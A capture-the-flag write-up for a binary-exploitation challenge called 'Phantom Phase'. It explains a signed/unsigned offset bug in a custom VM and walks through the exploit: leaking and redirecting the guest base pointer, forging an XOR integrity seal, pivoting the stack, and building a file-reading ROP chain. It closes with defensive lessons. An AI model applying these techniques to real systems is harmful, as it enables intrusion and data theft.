# Phantom Phase

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | AncientDragon |
| Points | 334 |
| Solves at time of solving | 10 |
| Flag | `zdk{DEAD_rEckon1N6_sl6N3d_the_wr0n6_CoURs3}` |

> tuff pwn? dont slop this.

## Executive Summary

`phantom_phase` is a stripped x86-64 PIE containing a custom register VM. The
VM executes framed `DRV1` programs with eight 64-bit registers and a 4 KiB
guest address space. A randomized callback table controls the result of each
execution phase, and an integrity seal is intended to prevent the guest from
retargeting those callbacks.

The vulnerability is a disagreement between the instruction validator and the
executor:

- The validator treats memory immediates as unsigned 12-bit offsets.
- `LOADQ` and `STOREQ` sign-extend those same 12 bits during execution.

Consequently, an immediate such as `0xe00` passes validation but executes as
`-0x200`. That reaches the hidden pointer controlling the base of guest memory.
The exploit reads that pointer, recovers the allocation base, and changes the
pointer so the protected callback table becomes addressable.

From there, the exploit decodes the normal phase-0 callback, derives the PIE
address of an embedded stack-pivot gadget, re-encodes it, and repairs the
callback integrity seal. The pivot lands on a ROP chain assembled by the VM in
the heap. The chain uses the seccomp-approved `openat`, `read`, and `write`
syscalls to return `/run/flag.txt`.

The exploit does not require a leaked address in its client, a libc offset, or
a brute-force step. All randomized addresses are derived inside the VM.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_phantom-phase.tar.gz`](challenge/pwn_phantom-phase.tar.gz) | Original downloaded handout | `a7b47439d992186da5671ce73ee20fe6048efc994362dd64d150cbcf0bd3ddde` |
| [`challenge/PHANTOM-PHASE-player.zip`](challenge/PHANTOM-PHASE-player.zip) | Inner player archive, including the supplied libc and loader | `1bddaa15bc6510b131f47591e51fd3803daf07b78decb91ab6458845e2abce01` |
| [`challenge/phantom_phase`](challenge/phantom_phase) | Extracted challenge executable | `9015845341a8ba006ed65443dcad5e54b30fbf4968b61fb8963e9a7b047d8fde` |
| [`challenge/assemble.py`](challenge/assemble.py) | Organizers' benign DRV1 image builder | `0230370fbf203cfa0528faa3f597ffc5cb6f9d3e5735b35bca77a46a008f3808` |
| [`challenge/run.sh`](challenge/run.sh) | Local launcher for the supplied loader and libc | `b637b9e261031aa24d672a8a95f1cb8eae0dfe2730a76732b802f1bdc52738d7` |
| [`solve.py`](solve.py) | Dependency-free remote exploit | `190bf9ce14bf57764ce2cc81d6a524f91e75666e4ab206a9008d668e01d6bf28` |
| [`artifacts/vm-layout.txt`](artifacts/vm-layout.txt) | VM framing, memory layout, callback equations, and gadget offsets | `4c5289975fe7a6eaccef6316d8b803d7b6ee356a6b528219517798d7cf52a7a0` |
| [`artifacts/seccomp-policy.txt`](artifacts/seccomp-policy.txt) | Decoded syscall allowlist | `30c9c6de0f7a286b8b01b790f81204f74323a527bd64537e41a2c13840f28084` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Successful remote transcript | `69ee64a7009c287da508e71f08d3f23d206b8e86c6bd110d6b588401b24b01a9` |

## 1. Handout Verification and Triage

The outer tarball contains a ZIP archive and its checksum:

```console
$ tar -tzvf pwn_phantom-phase.tar.gz
-rwxrwxrwx ... pwn_phantom-phase/PHANTOM-PHASE-player.zip
-rwxrwxrwx ... pwn_phantom-phase/PHANTOM-PHASE-player.zip.sha256

$ shasum -a 256 PHANTOM-PHASE-player.zip
1bddaa15bc6510b131f47591e51fd3803daf07b78decb91ab6458845e2abce01
```

The inner archive provides the executable, matching runtime libraries, a
launcher, and a small public program builder:

```text
assemble.py
ld-linux-x86-64.so.2
libc.so.6
phantom_phase
run.sh
SHA256SUMS.txt
```

Static triage gives the expected modern mitigations:

```console
$ file phantom_phase
phantom_phase: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
               stripped
```

| Mitigation | State |
| --- | --- |
| PIE | Enabled |
| NX | Enabled |
| Stack canary | Enabled |
| RELRO | Full |
| Symbols | Stripped |

The imported functions are mostly input/output and allocation routines. There
is no imported `system`, and the binary installs seccomp before entering the
VM. Direct shell execution is therefore not the intended route.

## 2. Understanding the DRV1 Format

The supplied `assemble.py` documents the wire format. A request starts with a
little-endian 32-bit blob length. The blob contains this header:

```python
struct.pack("<4sHHI", b"DRV1", instruction_count, data_length, 0)
```

Every instruction is eight bytes:

```python
struct.pack("<BBBBHH", opcode, dst, src, flags, imm, aux)
```

The VM exposes these opcodes:

| Opcode | Mnemonic | Operation |
| --- | --- | --- |
| `0x00` | `NOP` | No operation |
| `0x01` | `MOVI` | Load a 16-bit immediate |
| `0x02` | `MOV` | Register copy |
| `0x03` | `ADD` | 64-bit addition |
| `0x04` | `SUB` | 64-bit subtraction |
| `0x05` | `XOR` | 64-bit XOR |
| `0x06` | `OR` | 64-bit OR |
| `0x07` | `SHL` | Logical left shift |
| `0x08` | `SHR` | Logical right shift |
| `0x09` | `ROL` | Rotate left |
| `0x0a` | `ROR` | Rotate right |
| `0x0b` | `LOADQ` | Load a qword from guest memory |
| `0x0c` | `STOREQ` | Store a qword to guest memory |
| `0x0d` | `DIV` | Unsigned division |
| `0x0e` | `PRINT` | Print a register |
| `0x0f` | `JNZ` | Conditional branch |
| `0x10` | `HALT` | Finish through phase 0 |

The parser accepts between 1 and 512 instructions and up to `0x800` bytes of
initial data. It also checks that the framed size exactly matches the code and
data lengths, then validates each instruction before execution.

## 3. Native and Guest Memory

The process allocates a zeroed `0x1900`-byte native block. Guest offset zero is
not the start of this block; it begins at `real_base+0x900`.

```text
real_base+0x000  encoded callback table and integrity metadata
real_base+0x700  qword pointer to real_base+0x900
real_base+0x900  guest offset 0 / initialized data
real_base+0xd00  address preloaded into native_context+0x10
```

The first `0x900` bytes are meant to be inaccessible implementation state.
Most importantly, `real_base+0x700` holds the pointer used as the base for all
guest loads and stores.

## 4. The Signed/Unsigned Offset Bug

The instruction validator at `0x1a80` checks memory operands as unsigned
12-bit values. In simplified form, its relevant conditions are:

```c
raw = instruction.imm;
masked = raw & 0xfff;

if (raw > 0xfff)
    reject();
if (masked > 0xff8)
    reject();
```

The executor uses a different interpretation:

```asm
shl  ecx, 4
sar  cx, 4
movsx rax, cx
```

This sequence sign-extends the low 12 bits. Values from `0x800` through
`0xfff` become negative offsets. In particular:

```text
sign_extend_12(0xe00) = -0x200
```

Since the initial guest base is `real_base+0x900`, the instruction:

```text
LOADQ R0, [0xe00]
```

actually reads:

```text
(real_base+0x900) - 0x200 = real_base+0x700
```

The loaded qword is the current guest-base pointer itself. The first primitive
is therefore:

```text
R0 = [guest_base-0x200]  = real_base+0x900
R0 = R0-0x900           = real_base
[guest_base-0x200] = R0
```

After the store, the VM's guest base is `real_base`, making the hidden callback
table directly accessible at offsets `0x00` through `0x28`.

## 5. Randomized Callback Vectors

Four callbacks represent the execution phases:

```text
real_base+0x00  encoded phase 0: course accepted
real_base+0x08  encoded phase 1: course fault
real_base+0x10  encoded phase 2: course timeout
real_base+0x18  encoded phase 3: audit complete
real_base+0x20  integrity seal
real_base+0x28  random key
```

Each callback is XORed with the random key and rotated by a phase-specific
amount:

```text
vector[i] = rol64(callback[i] XOR key, 17+i)
```

The dispatcher reverses that encoding before checking that the decoded target
lies inside the PIE text range.

For phase 0:

```text
callback0 = ror64(vector0, 17) XOR key
          = PIE + 0x17c0
```

This gives the exploit an ASLR-resolved code pointer without printing anything
to the client.

## 6. Preserving the Integrity Seal

The callback seal is not a cryptographic MAC. It is a linear XOR expression:

```text
seal = rol64(vector1, 7)
     XOR rol64(vector3, 21)
     XOR vector0
     XOR rol64(vector2, 14)
     XOR 0x4452564d5345414c
```

Only phase 0 needs to change. If `old0` is the original encoded callback and
`new0` is the forged one, every unchanged term cancels:

```text
new_seal = old_seal XOR old0 XOR new0
```

That allows the exploit to update both `vector0` and the seal using only two
VM XOR operations and two stores.

## 7. Turning HALT into a Stack Pivot

The binary deliberately contains a useful gadget immediately before its
normal phase callbacks:

```asm
0x1750  mov rsp, qword [rdi+0x10]
0x1754  ret
```

The decoded phase-0 callback is `PIE+0x17c0`, so the pivot address is obtained
without knowing the PIE base explicitly:

```text
pivot = callback0 - 0x70 = PIE+0x1750
new0  = rol64(pivot XOR key, 17)
```

When the dispatcher invokes a callback, `rdi` points to the native VM context.
The field at `rdi+0x10` was initialized by `main` to `real_base+0xd00`.
Replacing phase 0 with the pivot therefore makes `HALT` execute a ROP chain at
that heap address.

## 8. Building the ROP Chain Inside the VM

PIE and heap ASLR prevent a static chain from being included in initial guest
data. The VM already knows both required bases:

- `R7` preserves `real_base` from the guest-pointer exploit.
- `R6` preserves the decoded pointer `PIE+0x17c0`.

Before constructing the chain, the exploit repoints guest memory once more:

```text
[real_base+0x700] = real_base+0xd00
```

Now `STOREQ` offset zero writes the first ROP qword. The remaining planted
gadgets are all small subtractions from `PIE+0x17c0`:

| Target | Address | Derivation |
| --- | --- | --- |
| Stack pivot | `PIE+0x1750` | callback0 - `0x70` |
| `pop rax; ret` | `PIE+0x1760` | callback0 - `0x60` |
| `pop rdi; ret` | `PIE+0x1770` | callback0 - `0x50` |
| `pop rsi; ret` | `PIE+0x1780` | callback0 - `0x40` |
| `pop rdx; ret` | `PIE+0x1790` | callback0 - `0x30` |
| `xchg rax, rdi; ret` | `PIE+0x17a0` | callback0 - `0x20` |
| `syscall; ret` | `PIE+0x17b0` | callback0 - `0x10` |

The pathname is placed in initialized guest data at `real_base+0xe80`, and the
read buffer is at `real_base+0xf00`. The VM writes this logical chain at
`real_base+0xd00`:

```text
openat(AT_FDCWD, path, O_RDONLY, 0)
xchg rax, rdi                  # move returned fd into rdi
read(fd, real_base+0xf00, 0x100)
write(1, real_base+0xf00, 0x100)
exit(0)
```

## 9. Working Within Seccomp

The program installs a classic BPF seccomp filter before starting the VM. The
decoded allowlist is:

```text
read, write, close, rt_sigreturn, exit, exit_group, openat
```

This explains the planted syscall and register-pop gadgets. The final chain
uses only four permitted syscalls and never needs libc.

## 10. Locating the Flag

The first working ROP chain read `/proc/self/environ`. That proved arbitrary
file read but did not expose a `FLAG` variable. Reading `/proc/1/cmdline`
revealed the challenge wrapper invocation:

```text
/opt/challenge/server
31337
/opt/challenge/phantom_phase
/run
```

The final argument is the working directory assigned to the challenge
process. Reading `/run/flag.txt` produced:

```text
zdk{DEAD_rEckon1N6_sl6N3d_the_wr0n6_CoURs3}
```

The wording is also a concise description of the bug: the VM's course changes
because its memory offset is signed in one phase and unsigned in another.

## 11. Reproduction

The solver uses only Python's standard library:

```console
$ python3 solve.py phantom-phase-fb785313a3b6.chals.z0d1ak.org 1337
PHANTOM PHASE relay controller
submit one framed DRV1 program
zdk{DEAD_rEckon1N6_sl6N3d_the_wr0n6_CoURs3}
```

For a newly spawned instance, replace the hostname:

```console
$ python3 solve.py HOSTNAME 1337
```

An optional third argument selects another readable path, which is useful for
reproducing the reconnaissance steps:

```console
$ python3 solve.py HOSTNAME 1337 /proc/self/environ
```

## 12. Lessons Learned

1. Validation and execution must use exactly the same integer type and
   normalization rules. A bounds check over an unsigned field is ineffective
   if execution later treats the field as signed.
2. Hiding metadata immediately before guest memory is fragile when negative
   addressing is possible. In this case, one exposed base pointer turns a
   narrow out-of-bounds primitive into full access to the protected region.
3. XOR-based integrity expressions are malleable. Once an attacker can read
   and write the protected values, changing one field and updating the seal is
   algebraically trivial.
4. PIE and randomized pointer encodings do not help when the guest can decode
   a legitimate code pointer and derive nearby gadgets at runtime.
5. A strict syscall allowlist meaningfully narrows post-exploitation, but it
   cannot stop a file-read ROP chain when `openat`, `read`, and `write` remain
   available.
